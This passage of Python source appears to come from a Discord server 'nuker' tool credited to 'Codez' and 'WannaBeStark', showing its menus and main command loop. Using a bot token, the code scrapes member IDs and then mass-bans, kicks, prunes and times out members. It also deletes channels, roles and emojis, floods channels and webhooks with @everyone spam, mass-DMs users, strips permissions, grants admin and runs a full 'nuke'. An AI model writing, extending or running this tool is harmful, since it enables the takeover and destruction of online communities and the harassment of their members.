    │ <05> Create Roles                 │ <16> Delete Invites               │ <27> Lock All Channels            │
    │ <06> Delete Channels              │ <17> Switch Guild                 │ <28> Unlock All Channels          │
    │ <07> Delete Roles                 │ <18> Timeout All                  │ <29> Rename Emojis                │
    │ <08> Delete Emojis                │ <19> Rename All Channels          │ <30> Unick All Users              │
    │ <09> Spam Channels                │ <20> Rename All Roles             │ <31> Nuke All                     │
    │ <10> Check Updates                │ <21> Webhook Spam                 │ <32> Get Invite Link (auto-copy)  │
    │ <11> Credits                      │ <22> Untimeout All                │ <33> Mode: Wizzler/Deadlizer      │
    ├───────────────────────────────────┼───────────────────────────────────┼───────────────────────────────────┤
    │ <34> Whitelist Add Member         │ <35> Whitelist Remove Member      │ <36> View Whitelist               │
    │ <37> Switch Config                │ <38> List Loaded Configs          │ <39> Exit                         │
    ╰───────────────────────────────────┴───────────────────────────────────┴───────────────────────────────────╯
    <40> Guild Info
    <41> Get Bot Invite Link"""
            options_raw_2 = """\
    <Made By Codez>
    ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
    ║                                             CODEZ RUNS CORD                                                 ║
    ╠════════════════════════════════════╦════════════════════════════════════╦══════════════════════════════════════╣
    ║ <01> Ban Members                   ║ <12> Nick All                      ║ <23> DM All Members                  ║
    ║ <02> Kick Members                  ║ <13> Change guild Icon             ║ <24> Unban All Members               ║
    ║ <03> Prune Members                 ║ <14> Change Guild Name/description ║ <25> Strip All Role Perms            ║
    ║ <04> Create Channels               ║ <15> Give Admin                    ║ <26> Auto Admin (Select Users)       ║
    ║ <05> Create Roles                  ║ <16> Delete Invites                ║ <27> Lock All Channels               ║
    ║ <06> Delete Channels               ║ <17> Switch Guild                  ║ <28> Unlock All Channels             ║
    ║ <07> Delete Roles                  ║ <18> Timeout All                   ║ <29> Rename Emojis                   ║
    ║ <08> Delete Emojis                 ║ <19> Rename All Channels           ║ <30> Unick All Users                 ║
    ║ <09> Spam Channels                 ║ <20> Rename All Roles              ║ <31> Nuke All                        ║
    ║ <10> Check Updates                 ║ <21> Webhook Spam                  ║ <32> Get Invite Link (auto-copy)     ║
    ║ <11> Credits                       ║ <22> Untimeout All                 ║ <33> Mode: Wizzler/Deadlizer         ║
    ╠════════════════════════════════════╬════════════════════════════════════╬══════════════════════════════════════╣
    ║ <34> Whitelist Add Member          ║ <35> Whitelist Remove Member       ║ <36> View Whitelist                  ║
    ║ <37> Switch Config                 ║ <38> List Loaded Configs           ║ <39> Exit                            ║
    ╚════════════════════════════════════╩════════════════════════════════════╩══════════════════════════════════════╝
    <40> Guild Info
    <41> Get Bot Invite Link"""
            options_raw_3 = """\
    <Made By Codez>
    ╔═════              ═════╗      ╔════════════════════════╗      ╔════════════════════════╗      ╔═════               ═════╗
    ║ [01] Ban all           ║      ║ [11] Shuffle Channels  ║      ║ [21] Create Emojis     ║      ║ [31] Nuke All           ║
    ║ [02] Unban all         ║      ║ [12] Unban Member      ║      ║ [22] Rename Guild      ║      ║ [32] Get Invite Link    ║
    ║ [03] Kick all          ║      ║ [13] Spam Channels     ║      ║ [23] Change Server     ║      ║ [33] Mode: W/D          ║
    ║ [04] Prune Member      ║      ║ [14] Webhook Spam      ║      ║ [24] Admin Everyone    ║      ║ [34] Whitelist Add      ║
    ║ [05] Nick all          ║      ║ [15] DM All            ║      ║ [25] Get Admin         ║      ║ [35] Whitelist Remove   ║
    ║ [06] Create Channels   ║══════║ [16] Create Roles      ║══════║ [26] Get Invite Link   ║══════║ [36] View Whitelist     ║
    ║ [07] Delete Channels   ║      ║ [17] Delete Roles      ║      ║ [27] Get Bot Link      ║      ║ [37] Switch Config      ║
    ║ [08] Rename Channels   ║      ║ [18] Rename Roles      ║      ║ [28] Change Server Icon║      ║ [38] List Loaded Configs║
    ║ [09] Lock Channels     ║      ║ [19] Full Nuke         ║      ║ [29] Credits           ║      ║ [39] Exit               ║
    ║ [10] Unlock Channels   ║      ║ [20] Delete Emojis     ║      ║ [30] Close             ║      ║ [40] Guild Info         ║
    ╚═════              ═════╝      ╚════════════════════════╝      ╚════════════════════════╝      ╚══════              ═════╝
    <41> Get Bot Invite Link"""
            options_raw_4 = """\
    <Made By Codez>
              ╔════════════════════════════════════════════════════════════════════════════════════╗          
      ╔═══════╩════════════════════════════════════════════════════════════════════════════════════╩═══════╗  
      ║ (01) - Ban Members      (02) - Kick Members       (03) - Prune Members      (04) - Create Channels ║  
      ║ (05) - Create Roles     (06) - Delete Channels    (07) - Delete Roles       (08) - Delete Emojis   ║  
      ║ (09) - Spam Channels    (10) - Check Updates      (11) - Credits            (12) - Nick All        ║  
      ║ (13) - Change Icon      (14) - Update G-Info      (15) - Give Admin         (16) - Delete Invites  ║  
      ║ (17) - Switch Guild     (18) - Timeout All        (19) - Rename Channels    (20) - Rename Roles    ║  
      ║ (21) - Webhook Spam     (22) - Untimeout All      (23) - DM All Members     (24) - Unban All Mem   ║  
      ║ (25) - Strip Perms      (26) - Auto Admin         (27) - Lock Channels      (28) - Unlock Server   ║  
      ║ (29) - Rename Emojis    (30) - Unick All Users    (31) - Nuke All           (32) - Get Invite Link ║  
      ║ (33) - Mode: W/D        (34) - Whitelist Add      (35) - Whitelist Rem      (36) - View Whitelist  ║  
     ║ (37) - Switch Config    (38) - List Configs       (39) - Exit Nuker         (40) - Guild Info      ║
      ╚═══════╦════════════════════════════════════════════════════════════════════════════════════╦═══════╝  
     ╚════════════════════════════════════════════════════════════════════════════════════╝
    <41> Get Bot Invite Link"""
            options_pool = [options_raw_1, options_raw_2, options_raw_3, options_raw_4]
            options_raw = options_pool[style_idx % len(options_pool)].strip('\n')
            options = '\n'.join(
                gradient_text(line.center(console_width), mode_start, mode_end, bold=True)
                for line in options_raw.splitlines())

            info_lines = [
                "   Codez On Top",
                f"     LOADED PROXIES: <{self.proxy_count}>",
                f"     ACTIVE CONFIG: [{__current_config_name__}] | Total Configs: {len(__loaded_configs__)}",
                f"     AUTO-ADMIN ON JOIN: [{'ON' if self.auto_admin_enabled else 'OFF'}] | Whitelisted: {len(self.whitelist)}",
                "    Join discord.gg/codez",
                ""
            ]
            self.last_ui = (banner_lines, info_lines, options_raw, mode_start, mode_end, console_width)

            if not self.menu_shown_once:
                if __mode__ == "deadlizer":
                    anim = random.choice([
                        self._deadlizer_menu_load_1, self._deadlizer_menu_load_2, 
                        self._deadlizer_menu_load_3, self._deadlizer_menu_load_4,
                        self._deadlizer_menu_load_5, self._deadlizer_menu_load_6,
                        self._deadlizer_menu_load_7, self._deadlizer_menu_load_8,
                        self._deadlizer_menu_load_9, self._deadlizer_menu_load_10,
                        "default"
                    ])
                else:
                    anim = random.choice([
                        self._wizzler_menu_load_1, self._wizzler_menu_load_2, 
                        self._wizzler_menu_load_3, self._wizzler_menu_load_4,
                        self._wizzler_menu_load_5, self._wizzler_menu_load_6,
                        self._wizzler_menu_load_7, self._wizzler_menu_load_8,
                        self._wizzler_menu_load_9, self._wizzler_menu_load_10,
                        "default"
                    ])
                
                if anim != "default":
                    await anim(banner_lines, info_lines, options_raw, mode_start, mode_end, console_width)
                else:
                    await self._menu_banner_animation(banner_lines, mode_start, mode_end, console_width)
                    await self._menu_details_animation(info_lines, options_raw, mode_start, mode_end, console_width)
            # Establish static frame — use ANSI home+erase instead of os.system(cls)
            sys.stdout.write("\033[H\033[2J\033[3J")
            sys.stdout.flush()
            print("\n".join(gradient_text(line.center(console_width), mode_start, mode_end, bold=True) for line in banner_lines))
            for line in info_lines:
                print(gradient_text(line.center(console_width), mode_start, mode_end, bold=True))
            print("\n".join(gradient_text(line.center(console_width), mode_start, mode_end, bold=True) for line in options_raw.splitlines()))
            print()  # Single blank line before prompt

            self._animating = True
            anim_task = asyncio.create_task(self._menu_animator())
            
            ans = await self.async_input(format_log_message("INPUT", "Select Option (press d+enter to switch modes)", 50))
            
            self._animating = False
            await anim_task

            if ans == "MODE_SWITCHED":
                # The switch animation already happened.
                # We set menu_shown_once=True to SKIP the menu-load animation
                # and just re-render the static menu in the new mode.
                self.menu_shown_once = True
                continue 
    
            ans = ans.strip()
    
            if ans in ["1", "01"]:
                scrape = await self.async_input(format_log_message("INPUT", "Fetch member IDs? [Y/N]", 50))
                scrape = scrape.strip().lower()
                if scrape == "y":
                    try:
                        os.makedirs("fetched", exist_ok=True)
                        session = await self._get_session()
                        members_list = []
                        last_id = 0
                        while True:
                            resp = await session.get(
                                f"https://discord.com/api/v10/guilds/{self.guildid}/members?limit=1000&after={last_id}",
                                headers={"Authorization": f"Bot {token}"}
                            )
                            if resp.status_code == 200:
                                data = resp.json()
                                if not data:
                                    break
                                members_list.extend([m['user']['id'] for m in data])
                                last_id = data[-1]['user']['id']
                                if len(data) < 1000:
                                    break
                            else:
                                print(format_log_message("ERROR", f"Failed to fetch members: {resp.status_code}", 47))
                                break
                        if members_list:
                            with open("fetched/members.txt", "w") as f:
                                for member_id in members_list:
                                    f.write(f"{member_id}\n")
                            print(format_log_message("SUCCESS", f"Fetched {len(members_list)} members", 38))
                        else:
                            print(format_log_message("ERROR", "No members returned or guild not accessible!", 47))
                            continue
    
                    except Exception as e:
                        print(format_log_message("ERROR", f"Error fetching members | {e}", 41))
                try:
                    with open("fetched/members.txt", "r") as f:
                        members = [line.strip() for line in f if line.strip()]
                    if not members:
                        print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                        continue
                except FileNotFoundError:
                    print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                    continue
                except Exception as e:
                    print(
                        format_log_message(
            "ERROR",
            f"Error reading members | {e}",
            41))
                    continue
    
                self.banned.clear()
                current_reason = __config__.get("operations", {}).get("ban_reason", "Nuked by WannaBeStark")
                reason_inp = await self.async_input(format_log_message("INPUT", f"Ban reason (default: {current_reason})", 50))
                reason_inp = reason_inp.strip()
                if reason_inp:
                    __config__.setdefault("operations", {})["ban_reason"] = reason_inp
                start_time = time.time()
                tasks = [self.execute_ban(member, token) for member in members]
                await asyncio.gather(*tasks)
                end_time = time.time()
                duration = end_time - start_time
                print(
                    format_log_message(
            "SUCCESS",
            f"Banned {len(self.banned)}/{len(members)} members in ({duration:.2f}s)",
            36))
                await asyncio.sleep(pause_seconds)
                continue
    
            elif ans in ["2", "02"]:
                try:
                    with open("fetched/members.txt", "r") as f:
                        members = [line.strip() for line in f if line.strip()]
                    if not members:
                        print(
                            format_log_message(
            "ERROR",
            "No members found. Fetch first.",
            33))
                        continue
                except FileNotFoundError:
                    print(
                        format_log_message(
            "ERROR",
            "members.txt not found. Fetch first.",
            29))
                    continue
                except Exception as e:
                    print(
                        format_log_message(
            "ERROR",
            f"Error reading members | {e}",
            41))
                    continue
    
                self.kicked.clear()
                start_time = time.time()
                tasks = [self.execute_kick(member, token) for member in members]
                await asyncio.gather(*tasks)
                end_time = time.time()
                duration = end_time - start_time
                print(
                    format_log_message(
            "SUCCESS",
            f"Kicked {len(self.kicked)}/{len(members)} members in ({duration:.2f}s)",
            36))
                await asyncio.sleep(pause_seconds)
                continue
    
            elif ans in ["3", "03"]:
                try:
                    days_input = await self.async_input(format_log_message("INPUT", "Prune days (1-30)", 50))
                    days = int(days_input.strip())
                    if 1 <= days <= 30:
                        start_time = time.time()
                        pruned_count = await self.execute_prune(days, token)
                        end_time = time.time()
                        duration = end_time - start_time
                        if pruned_count > 0:
                            print(
                                format_log_message(
            "SUCCESS",
            f"Finished pruning {pruned_count} members in ({duration:.2f}s)",
            43))
                    else:
                        print(
                            format_log_message(
            "ERROR",
            f"Days must be 1-30: {gradient_text(days_input, PINK_START, PINK_END, bold=True)}!",
            46))
                except ValueError:
                    print(
                        format_log_message(
            "ERROR",
            f"Invalid input: {gradient_text(days_input, PINK_START, PINK_END, bold=True)}!",
            48))
                continue
    
            elif ans in ["4", "04"]:
                type_input = await self.async_input(format_log_message("INPUT", "Channel type ['t'ext/'v'oice]", 50))
                type_ = 2 if type_input.strip().lower() == 'v' else 0
                if __manual_mode__ and not __config__["nuke"]["channel_names"]:
                    names_input = await self.async_input(format_log_message("INPUT", "Channel names (comma-separated)", 50))
                    parsed = [x.strip() for x in names_input.split(",") if x.strip()]
                    if not parsed:
                        parsed = ["wizzed-by-WannaBeStark"]
                    __config__["nuke"]["channel_names"] = parsed
                try:
                    amount_input = await self.async_input(format_log_message("INPUT", "Amount", 50))
                    amount = int(amount_input.strip())
                    if amount <= 0:
                        raise ValueError
                except ValueError:
                    print(
                        format_log_message(
            "ERROR",
            f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!",
            47))
                    continue
    
                self.channels.clear()
                start_time = time.time()
                tasks = [
        self.execute_crechannels(
            random.choice(
                __config__["nuke"]["channel_names"]),
                type_,
                token) for _ in range(amount)]
                await asyncio.gather(*tasks)
                end_time = time.time()
                duration = end_time - start_time
                print(
                    format_log_message(
            "SUCCESS",
            f"Created {len(self.channels)}/{amount} channels in ({duration:.2f}s)",
            36))
                await asyncio.sleep(pause_seconds)
                continue
    
            elif ans in ["5", "05"]:
                if __manual_mode__ and not __config__["nuke"]["roles_name"]:
                    roles_input = await self.async_input(format_log_message("INPUT", "Role names (comma-separated)", 50))
                    parsed = [x.strip() for x in roles_input.split(",") if x.strip()]
                    if not parsed:
                        parsed = ["WannaBeStark On Top"]
                    __config__["nuke"]["roles_name"] = parsed
                try:
                    amount_input = await self.async_input(format_log_message("INPUT", "Amount", 50))
                    amount = int(amount_input.strip())
                    if amount <= 0:
                        raise ValueError
                except ValueError:
                    print(
                        format_log_message(
            "ERROR",
            f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!",
            47))
                    return
    
                self.roles.clear()
                start_time = time.time()
                tasks = [
        self.execute_creroles(
            random.choice(
                __config__["nuke"]["roles_name"]),
                token) for _ in range(amount)]
                await asyncio.gather(*tasks)
                end_time = time.time()
                duration = end_time - start_time
                print(
                    format_log_message(
            "SUCCESS",
            f"Created {len(self.roles)}/{amount} roles in ({duration:.2f}s)",
            40))
                await asyncio.sleep(pause_seconds)
                continue
    
            elif ans in ["6", "06"]:
                try:
                    session = await self._get_session()
                    response = await session.get(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                        headers={"Authorization": f"Bot {token}"}
                        )
                    if response.status_code == 200:
                        channels = response.json()
                    else:
                        print(
                            format_log_message(
            "ERROR",
            "Failed to fetch channels",
            39))
                        continue
                except Exception as e:
                    print(
                        format_log_message(
            "ERROR",
            f"Error fetching channels | {e}",
            39))
                    continue
    
                if not channels:
                    print(format_log_message("ERROR", "No channels found!", 44))
                    continue
    
                self.channels.clear()
                start_time = time.time()
                tasks = [
        self.execute_delchannels(
            ch['id'],
            token) for ch in channels]
                await asyncio.gather(*tasks)
                end_time = time.time()
                duration = end_time - start_time
                print(
                    format_log_message(
            "SUCCESS",
            f"Deleted {len(self.channels)}/{len(channels)} channels in ({duration:.2f}s)",
            36))
                await asyncio.sleep(pause_seconds)
                continue
    
            elif ans in ["7", "07"]:
                try:
                    print(
                        format_log_message(
            "INFO",
            "Starting fast deletion of all roles...",
            48))
                    start_time = time.time()
                    deleted_count = await self.execute_delroles_all(token)
                    end_time = time.time()
                    duration = end_time - start_time
    
                    if not isinstance(deleted_count, int):
                        deleted_count = 0
                    if deleted_count > 0:
                        print(
                            format_log_message(
            "SUCCESS",
            f"Successfully deleted {deleted_count} roles in {duration:.2f}s",
            45))
                    else:
                        print(
                            format_log_message(
            "INFO",
            f"Role deletion finished in {duration:.2f}s | no roles were deleted",
            45))
    
                    await asyncio.sleep(2.5)
                    continue
                except Exception as e:
                    print(
                        format_log_message(
            "ERROR",
            f"Mass role deletion failed: {str(e)}",
            42))
                    await asyncio.sleep(2.5)
                    continue
    
    
            elif ans in ["8", "08"]:
                try:
                    print(
                        format_log_message(
            "INFO",
            "Starting fast deletion of all emojis...",
            48))
                    start_time = time.time()
                    deleted_count = await self.execute_delemojis_all(token)
                    end_time = time.time()
                    duration = end_time - start_time
    
                    if deleted_count > 0:
                        print(
                            format_log_message(
            "SUCCESS",
            f"Successfully deleted {deleted_count} emojis in {duration:.2f}s",
            45))
                    else:
                        print(
                            format_log_message(
            "INFO",
            f"Emoji deletion finished in {duration:.2f}s | no emojis were deleted",
            45))
    
                    await asyncio.sleep(2.5)
                    continue
                except Exception as e:
                    print(
                        format_log_message(
            "ERROR",
            f"Mass emoji deletion failed: {str(e)}",
            42))
                    await asyncio.sleep(2.5)
                    continue
    
            elif ans in ["9", "09"]:
                if __manual_mode__ and not __config__["nuke"]["messages_content"]:
                    msgs_input = await self.async_input(format_log_message("INPUT", "Spam messages (comma-separated)", 50))
                    parsed = [x.strip() for x in msgs_input.split(",") if x.strip()]
                    if not parsed:
                        parsed = ["@everyone @here Wizzed by WannaBeStark join discord.gg/codez"]
                    __config__["nuke"]["messages_content"] = parsed
                try:
                    amount_input = await self.async_input(format_log_message("INPUT", "Spam amount", 50))
                    amount = int(amount_input.strip())
                    if amount <= 0:
                        raise ValueError
                except ValueError:
                    print(
                        format_log_message(
            "ERROR",
            f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!",
            47))
                    return
    
                try:
                    session = await self._get_session()
                    response = await session.get(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                        headers={"Authorization": f"Bot {token}"}
                        )
                    if response.status_code == 200:
                        channels = response.json()
                    else:
                        print(
                            format_log_message(
            "ERROR",
            "Failed to fetch channels",
            39))
                        return
                except Exception as e:
                    print(
                        format_log_message(
            "ERROR",
            f"Error fetching channels | {e}",
            39))
                    return
    
                if not channels:
                    print(format_log_message("ERROR", "No channels found!", 44))
                    return
    
                self.messages.clear()
                self.channels = [ch['id'] for ch in channels if ch['type'] == 0]
                if not self.channels:
                    print(
                        format_log_message(
            "ERROR",
            "No text channels found for spam!",
            32))
                    return
    
                channel_cycle = cycle(self.channels)
                start_time = time.time()
                tasks = [
        self.execute_massping(
            next(channel_cycle),
            random.choice(
                __config__["nuke"]["messages_content"]),
                token) for _ in range(amount)]
                await asyncio.gather(*tasks)
                end_time = time.time()
                duration = end_time - start_time
                print(
                    format_log_message(
            "SUCCESS",
            f"Spammed {len(self.messages)}/{amount} messages in ({duration:.2f}s)",
            36))
                await asyncio.sleep(pause_seconds)
                continue
            elif ans == "10":
                print(format_log_message("INFO", "CHECKING UPDATES", 40))
                await asyncio.sleep(pause_seconds)
                webbrowser.open("https://discord.gg/codez")
    
                continue
            elif ans == "11":
                credits = f"""
    {format_log_message("INFO", "Credits:", 48)}
    - MADE BY codez.
    - Join Discord server
    | https://discord.gg/codez
    - Press Enter to return.
                """
                print(credits)
                await self.async_input("")
                continue
    
            elif ans == "12":
                nn = await self.async_input(format_log_message("INPUT", "New nickname for all members", 50))
                nn = nn.strip()
                if nn:
                    await self.execute_nick_all_fast(token, nn)
                else:
                    print(
                        format_log_message(
            "ERROR",
            "Nickname cannot be empty",
            45))
                await asyncio.sleep(1.8)
                continue
    
            elif ans == "13":
                start_time = time.time()
                success = await self.execute_change_icon(token)
                end_time = time.time()
                duration = end_time - start_time
                if success:
                    print(
                        format_log_message(
            "SUCCESS",
            f"Change icon completed in ({duration:.2f}s)",
            38))
                else:
                    print(
                        format_log_message(
            "INFO",
            f"Change icon process finished in ({duration:.2f}s)",
            36))
                await asyncio.sleep(pause_seconds)
                continue
    
            elif ans == "14":
                start_time = time.time()
                success = await self.execute_change_guild_info(token)
                end_time = time.time()
                duration = end_time - start_time
                if success:
                    print(
                        format_log_message(
            "SUCCESS",
            f"Change guild info completed in ({duration:.2f}s)",
            35))
                else:
                    print(
                        format_log_message(
            "INFO",
            f"Change guild info process finished in ({duration:.2f}s)",
            33))
                await asyncio.sleep(pause_seconds)
                continue
    
            elif ans == "15":
                success_count, duration = await self.execute_give_admin(token)
                if duration > 0:
                    print(
                        format_log_message(
            "SUCCESS",
            f"Assigned admin to {success_count} users in ({duration:.2f}s)",
            36))
                else:
                    print(
                        format_log_message(
            "INFO",
            f"Assign admin process finished in ({duration:.2f}s)",
            34))
                continue
    
            elif ans == "16":
                deleted_count, duration, total_invites = await self.execute_delete_invites(token)
                if duration > 0 or total_invites > 0:
                    print(
                        format_log_message(
            "SUCCESS",
            f"Deleted {deleted_count}/{total_invites} invites in ({duration:.2f}s)",
            44))
                else:
                    print(
                        format_log_message(
            "INFO",
            f"Delete invites process finished in ({duration:.2f}s)",
            42))
                    await asyncio.sleep(pause_seconds)
                continue
    
            elif ans == "17":
                print(format_log_message("INFO", "Switching guild...", 45))
                guildid = await self.async_input(format_log_message("INFO", "Enter new Guild ID", 50))
                guildid = guildid.strip()
                os.system("cls") if os.name == "nt" else os.system("clear")
                await shakti(guildid).menu()
                os._exit(0)
    
            elif ans == "18":
                print(format_log_message("INFO", "Select Timeout Duration:", 50))
                print(
        gradient_text(
            "╭" + "─" * 60 + "╮",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "│ [1] 1 Day                                                  │",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "│ [2] 1 Week                                                 │",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "│ [3] 28 Days (Max)                                          │",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "╰" + "─" * 60 + "╯",
            PINK_START,
            PINK_END,
            bold=True))
    
                duration_choice = await self.async_input(format_log_message("INFO", "Choose duration (1-3)", 50))
                duration_map = {
                    "1": 86400,
                    "2": 604800,
                    "3": 2419200
                }
    
                duration_seconds = duration_map.get(duration_choice.strip())
    
                if not duration_seconds:
                    print(
                        format_log_message(
            "ERROR",
            f"Invalid choice: {gradient_text(duration_choice, PINK_START, PINK_END, bold=True)}!",
            47))
                    return
    
                try:
                    with open("fetched/members.txt", "r") as f:
                        members = [line.strip() for line in f if line.strip()]
                except FileNotFoundError:
                    print(
                        format_log_message(
            "ERROR",
            "members.txt not found. Fetch first.",
            29))
                    return
    
                start_time = time.time()
                tasks = [
        self.execute_timeout_all(
            member,
            duration_seconds,
            token) for member in members]
                results = await asyncio.gather(*tasks)
                end_time = time.time()
                duration = end_time - start_time
                success_count = sum(1 for r in results if r is True)
                await asyncio.sleep(pause_seconds)
                print(
                    format_log_message(
            "SUCCESS",
            f"Attempted to timeout {len(members)} members, succeeded {success_count} in ({duration:.2f}s)",
            35))
                continue
    
            elif ans == "19":
                count = await self.execute_rename_channels(token)
                print(
                    format_log_message(
            "SUCCESS",
            f"Renamed {count} channels",
            40))
                continue
    
            elif ans == "20":
                count = await self.execute_rename_roles(token)
                print(format_log_message("SUCCESS", f"Renamed {count} roles", 40))
                continue
    
            elif ans == "21":
                if __manual_mode__ and not __config__.get("nuke", {}).get("webhooks"):
                    name_inp = await self.async_input(format_log_message("INPUT", "Webhook name (default: WannaBeStark op)", 50))
                    name = name_inp.strip() or "WannaBeStark op"
                    avatar_inp = await self.async_input(format_log_message("INPUT", "Webhook avatar URL (optional)", 50))
                    avatar_url = avatar_inp.strip()
                    msgs_inp = await self.async_input(format_log_message("INPUT", "Webhook messages (comma-separated)", 50))
                    msgs = [x.strip() for x in msgs_inp.split(",") if x.strip()]
                    if not msgs:
                        msgs = ["@everyone @here Wizzled by WannaBeStark"]
                    __config__["nuke"].setdefault("webhooks", {})
                    __config__["nuke"]["webhooks"] = {
                        "name": name,
                        "avatar_url": avatar_url,
                        "messages": msgs
                    }
                count = await self.execute_webhook_spam(token)
                print(
                    format_log_message(
            "SUCCESS",
            f"Sent {count} webhook messages",
            40))
                continue
                await asyncio.sleep(pause_seconds)
    
            elif ans == "22":
                start_time = time.time()
                count = await self.execute_untimeout_all(token)
                end_time = time.time()
                duration = end_time - start_time
                await asyncio.sleep(pause_seconds)
                print(
                    format_log_message(
            "SUCCESS",
            f"Removed timeout from {count} members in ({duration:.2f}s)",
            40))
                continue
                await asyncio.sleep(pause_seconds)
            elif ans == "23":
                count = await self.execute_dm_all(token)
                print(format_log_message("SUCCESS", f"DM'd {count} members", 40))
                continue
                await asyncio.sleep(pause_seconds)
            elif ans == "24":
                count = await self.execute_unban_all(token)
                continue
            elif ans == "25":
                count = await self.execute_strip_perms(token)
                print(format_log_message("SUCCESS", f"Stripped perms from {count} roles", 40))
                continue
                await asyncio.sleep(pause_seconds)
                continue
    
            elif ans == "26":
                print(
        gradient_text(
            "╭" + "─" * 70 + "╮",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "│ Auto Admin Options:                                                  │",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "│ [1] Grant admin to users immediately                                 │",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "│ [2] Toggle auto-admin on join for whitelisted users                  │",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            f"│ Current auto-admin status: {'ENABLED' if self.auto_admin_enabled else 'DISABLED':<38}    │",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "╰" + "─" * 70 + "╯",
            PINK_START,
            PINK_END,
            bold=True))
    
                choice = await self.async_input(format_log_message("INFO", "Select option [1/2]", 50))
                choice = choice.strip().lower()
    
                if choice == "1":
                    user_ids_input = await self.async_input(format_log_message("INFO", "User IDs for admin (comma-separated)", 50))
                    user_ids = [uid.strip() for uid in user_ids_input.split(
                        ',') if uid.strip() and uid.strip().isdigit()]
    
                    if not user_ids:
                        print(
                            format_log_message(
            "ERROR",
            "No valid user IDs provided",
            40))
                        await asyncio.sleep(1.5)
                        return
    
                    session = await self._get_session()
                    invalid_users = []
                    for uid in user_ids:
                        resp = await session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/members/{uid}", headers={"Authorization": f"Bot {token}"})
                        if resp.status_code != 200:
                            invalid_users.append(uid)
                    if invalid_users:
                        print(format_log_message("ERROR", f"Users not in guild: {', '.join(invalid_users)}", 55))
                        print(format_log_message("INFO", "Clearing and reloading menu.", 40))
                        os.system("cls" if os.name == "nt" else "clear")
                        continue
    
                    success_count = 0
                    for user_id in user_ids:
                        if await self.execute_auto_admin(token, user_id):
                            success_count += 1
    
                    print(
                        format_log_message(
            "SUCCESS",
            f"Admin granted to {success_count}/{len(user_ids)} users",
            40))
    
                elif choice == "2":
                    self.auto_admin_enabled = not self.auto_admin_enabled
                    status = "ENABLED" if self.auto_admin_enabled else "DISABLED"
                    print(
                        format_log_message(
            "SUCCESS",
            f"Auto-admin on join now {status}",
            40))
    
                else:
                    print(
                        format_log_message(
            "ERROR",
            f"Invalid choice: {choice}",
            47))
    
                await asyncio.sleep(1.2)
                continue
    
            elif ans == "27":
                start_time = time.time()
                success = await self.execute_lock_all_channels(token)
                end_time = time.time()
                duration = end_time - start_time
                if success:
                    print(
                        format_log_message(
            "SUCCESS",
            f"Locked all channels in ({duration:.2f}s)",
            35))
                else:
                    print(
                        format_log_message(
            "INFO",
            f"Lock channels process finished in ({duration:.2f}s)",
            33))
                continue
                await asyncio.sleep(pause_seconds)
    
            elif ans == "28":
                start_time = time.time()
                success = await self.execute_unlock_all_channels(token)
                end_time = time.time()
                duration = end_time - start_time
                await asyncio.sleep(pause_seconds)
                if success:
                    print(
                        format_log_message(
            "SUCCESS",
            f"Unlocked all channels in ({duration:.2f}s)",
            35))
                else:
                    print(
                        format_log_message(
            "INFO",
            f"Unlock channels process finished in ({duration:.2f}s)",
            33))
                continue
                await asyncio.sleep(pause_seconds)
            elif ans == "29":
                count = await self.execute_rename_emojis(token)
                print(format_log_message("SUCCESS", f"Renamed {count} emojis", 40))
                await asyncio.sleep(pause_seconds)
            elif ans == "30":
                await self.execute_unick_all_fast(token)
                await asyncio.sleep(1.8)
                continue
            elif ans == "31":
                if __manual_mode__:
                    if not __config__["nuke"]["channel_names"]:
                        names_input = await self.async_input(format_log_message("INPUT", "Channel names (comma-separated)", 50))
                        parsed = [x.strip() for x in names_input.split(",") if x.strip()]
                        if not parsed:
                            parsed = ["wizzed-by-WannaBeStark"]
                        __config__["nuke"]["channel_names"] = parsed
                    if not __config__["nuke"]["roles_name"]:
                        roles_input = await self.async_input(format_log_message("INPUT", "Role names (comma-separated)", 50))
                        parsed = [x.strip() for x in roles_input.split(",") if x.strip()]
                        if not parsed:
                            parsed = ["WannaBeStark On Top"]
                        __config__["nuke"]["roles_name"] = parsed
                    if not __config__["nuke"]["messages_content"]:
                        msgs_input = await self.async_input(format_log_message("INPUT", "Spam messages (comma-separated)", 50))
                        parsed = [x.strip() for x in msgs_input.split(",") if x.strip()]
                        if not parsed:
                            parsed = ["@everyone @here Wizzed by WannaBeStark join discord.gg/codez"]
                        __config__["nuke"]["messages_content"] = parsed
                    if not __config__["nuke"].get("webhooks"):
                        name_inp = await self.async_input(format_log_message("INPUT", "Webhook name (default: WannaBeStark op)", 50))
                        name = name_inp.strip() or "WannaBeStark op"
                        avatar_inp = await self.async_input(format_log_message("INPUT", "Webhook avatar URL (optional)", 50))
                        avatar_url = avatar_inp.strip()
                        msgs_inp = await self.async_input(format_log_message("INPUT", "Webhook messages (comma-separated)", 50))
                        msgs = [x.strip() for x in msgs_inp.split(",") if x.strip()]
                        if not msgs:
                            msgs = ["@everyone @here Wizzled by WannaBeStark"]
                        __config__["nuke"]["webhooks"] = {
                            "name": name,
                            "avatar_url": avatar_url,
                            "messages": msgs
                        }
                await self.execute_nuke_all(token)
                print(format_log_message("SUCCESS", "FULL NUKE COMPLETE", 40))
                await asyncio.sleep(pause_seconds)
            elif ans == "32":
                await self.execute_get_invite(token)
                time.sleep(1.5)
            elif ans == "33":
                if __mode__ == "wizzler":
                    await switch_to_deadlizer()
                else:
                    await switch_to_wizzler()
                self.menu_shown_once = False
                continue
    
            elif ans == "34":
                user_ids_input = await self.async_input(format_log_message("INFO", "User IDs to whitelist (comma-separated)", 50))
